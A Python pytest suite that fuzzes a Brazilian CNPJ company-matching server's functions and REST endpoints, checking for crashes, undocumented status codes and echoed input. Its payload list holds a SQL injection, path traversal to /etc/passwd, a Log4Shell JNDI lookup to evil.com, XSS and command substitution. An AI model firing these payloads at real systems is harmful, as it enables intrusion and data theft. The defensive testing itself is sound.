"""Adversarial input fuzzing against every public match/check endpoint and
core matching function. The goal is to ensure that:

- No malformed input crashes with an unhandled exception.
- Every response either is a valid documented shape or a structured ErrorObj.
- Adversarial strings are NEVER echoed back verbatim in non-`raw` fields.
"""

from __future__ import annotations

import json
from typing import Any

import pytest
from fastapi.testclient import TestClient

from brasil_mcp_match_server.adapters.rest.app import app
from brasil_mcp_match_server.core.matching.localizacao import match_cep, match_municipio, match_uf
from brasil_mcp_match_server.core.matching.porte import check_porte_empresa
from brasil_mcp_match_server.core.matching.razao_social import match_razao_social
from brasil_mcp_match_server.core.matching.situacao import check_situacao_cadastral

# Canonical adversarial payloads — mirror the brasil-mcp-essentials suite.
# Intentional unicode confusables — ruff's ambiguous-char lint is the point here.
ADVERSARIAL: list[str] = [
    "",
    " " * 100,
    "A" * 10_000,
    "‮" * 100,  # RLO unicode override
    "​" * 50,  # zero-width space
    "\x00\x00\x00\x00",
    "\n\r\t\v\f",
    "🇧🇷🇧🇷🇧🇷",
    "Ｆｕｌｌｗｉｄｔｈ",  # full-width latin  # noqa: RUF001
    "../../etc/passwd",
    "'; DROP TABLE empresa; --",
    "${jndi:ldap://evil.com/x}",
    "{{config}}",
    "<script>alert(1)</script>",
    "$(cat /etc/passwd)",
    "12345678000195\x00",
]


# ---------- Core matching functions: never raise ----------


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_match_razao_social_does_not_crash(payload: str) -> None:
    """match_razao_social() must always return a RazaoSocialMatch dataclass."""
    r = match_razao_social(payload, "PETROLEO BRASILEIRO")
    assert isinstance(r.match, bool)
    assert 0.0 <= r.confidence <= 1.0


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_match_razao_social_in_rf_position(payload: str) -> None:
    """Adversarial in the RF position also must not crash."""
    r = match_razao_social("Petrobras", payload)
    assert isinstance(r.match, bool)


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_match_uf_does_not_crash(payload: str) -> None:
    r = match_uf(payload, "SP")
    assert isinstance(r.match, bool)


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_match_municipio_does_not_crash(payload: str) -> None:
    r = match_municipio(payload, "SAO PAULO")
    assert isinstance(r.match, bool)


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_match_cep_does_not_crash(payload: str) -> None:
    r = match_cep(payload, "01310200")
    assert isinstance(r.match, bool)


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_check_situacao_does_not_crash(payload: str) -> None:
    r = check_situacao_cadastral(payload, since=None)
    assert isinstance(r.situacao.value, str)


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_check_porte_does_not_crash(payload: str) -> None:
    r = check_porte_empresa(payload, opcao_simples=payload, opcao_mei=payload)
    assert isinstance(r.is_mei, bool)


# ---------- REST endpoints: never 500, always structured ----------


_VALID_CNPJ = "33000167000101"


def _expect_documented_status(status_code: int, path: str) -> None:
    """Acceptable status codes for adversarial input:
    200, 202, 401, 404, 410, 422, 429.  Never 5xx.
    """
    assert status_code < 500, f"{path} returned {status_code} — server crashed"
    assert status_code in {200, 202, 401, 404, 410, 422, 429}, (
        f"{path} returned unexpected {status_code}"
    )


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_match_razao_social_handles_adversarial_cnpj(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/match/razao-social",
        json={"cnpj": payload, "nome": "Petrobras"},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "match/razao-social cnpj")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_match_razao_social_handles_adversarial_nome(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/match/razao-social",
        json={"cnpj": _VALID_CNPJ, "nome": payload},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "match/razao-social nome")
    if r.status_code == 200:
        body = r.json()
        # Output never echoes the input nome.
        assert _no_input_echo(body, payload, allowed_keys={"query_id"}), (
            f"adversarial nome echoed in body: {body!r}"
        )


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_check_situacao_handles_adversarial_cnpj(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/check/situacao",
        json={"cnpj": payload},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "check/situacao")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_check_porte_handles_adversarial_cnpj(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/check/porte",
        json={"cnpj": payload},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "check/porte")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_match_uf_handles_adversarial_cnpj(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/match/uf",
        json={"cnpj": payload, "uf": "SP"},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "match/uf cnpj")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_match_uf_handles_adversarial_uf(service_context, api_key: str, payload: str) -> None:
    client = TestClient(app)
    r = client.post(
        "/v1/match/uf",
        json={"cnpj": _VALID_CNPJ, "uf": payload},
        headers={"X-Brasil-MCP-Key": api_key},
    )
    _expect_documented_status(r.status_code, "match/uf uf")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_post_opt_out_handles_adversarial_cnpj(service_context, payload: str) -> None:
    client = TestClient(app)
    try:
        r = client.post(
            f"/v1/opt-out/{payload}",
            json={"proof_type": "email", "proof_value": "x@example.com"},
        )
    except Exception as exc:
        # The httpx client refuses some inputs (control chars, etc.) before
        # the server even sees them — that's an acceptable defense-in-depth
        # layer; just assert it's a transport-level rejection, not a server crash.
        assert "Invalid" in str(exc) or "URL" in str(exc) or "ASCII" in str(exc)
        return
    _expect_documented_status(r.status_code, "opt-out")


@pytest.mark.parametrize("payload", ADVERSARIAL)
def test_get_audit_handles_adversarial_query_id(
    service_context, api_key: str, payload: str
) -> None:
    client = TestClient(app)
    try:
        r = client.get(
            f"/v1/audit/{payload}",
            headers={"X-Brasil-MCP-Key": api_key},
        )
    except Exception as exc:
        # Same as above — transport refusing is OK.
        assert "Invalid" in str(exc) or "URL" in str(exc) or "ASCII" in str(exc)
        return
    _expect_documented_status(r.status_code, "audit")


# ---------- Helper: no-echo check ----------


def _no_input_echo(
    body: dict[str, Any] | list[Any] | str | None,
    needle: str,
    allowed_keys: set[str],
) -> bool:
    """True if the serialized response does NOT contain the adversarial needle
    outside of allowed_keys (e.g., we never echo back the input nome verbatim).
    """
    if not needle or len(needle.strip()) < 4:
        return True  # nothing meaningful to check against (empty/whitespace)
    # Reject if the needle appears anywhere in the serialized JSON.
    text = json.dumps(body, default=str, ensure_ascii=False)
    return needle not in text
